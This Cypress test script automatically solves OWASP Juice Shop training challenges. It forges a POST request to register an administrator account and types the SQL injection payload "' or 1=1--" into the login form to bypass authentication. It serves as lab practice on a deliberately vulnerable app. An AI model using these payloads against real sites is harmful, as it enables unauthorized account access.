import '../support/index';

describe("Pwned JuiceShop", () => {

  beforeEach(() => {
    cy.visit('/')
    .then(() => {
      cy.get('.cc-btn').click();
      cy.get('.close-dialog').click();
    });
  });
  
  after(() => {
    cy.visit('/#/score-board');
  });
  
  it("Find the carefully hidden ‘Score Board’ page.", () => {
      
    cy.visit('/#/score-board')
    .then(() => {
      cy.isSolvedChallenge('scoreBoardChallenge').should('eq', true);
    });
        
  });
    
  it("Register as a user with administrator privileges", () => {

    // Forge POST request to create an admin user
    const options = {
      method: 'POST',
      url: '/api/Users/',
      form: true, // we are submitting a regular form body
      body: {
        email:`pwned.${Date.now()}@juiceshop.com`,
        password:'pwned',
        passwordRepeat:'pwned',
        securityQuestion: {
          id:5,
          question:'Maternal grandmother\'s first name?',
          createdAt:'2020-06-11T21:38:56.400Z',
          updatedAt:'2020-06-11T21:38:56.400Z'
        },
        "securityAnswer":"pwned"
      }
    }

    cy.request(options)
    .then(() => {
      cy.isSolvedChallenge('registerAdminChallenge').should('eq', true);
    });
        
        
  });
  
  it("Log in with the administrator’s user account.", () => {
      
    cy.visit('http://localhost:3000/#/login')
    .then(() => {
      cy.get('#email').type("' or 1=1--");
      cy.get('#password').type("foo");
      cy.get('#loginButton').click();
      cy.isSolvedChallenge('loginAdminChallenge').should('eq', true);
    });
    
  });
  
    
});
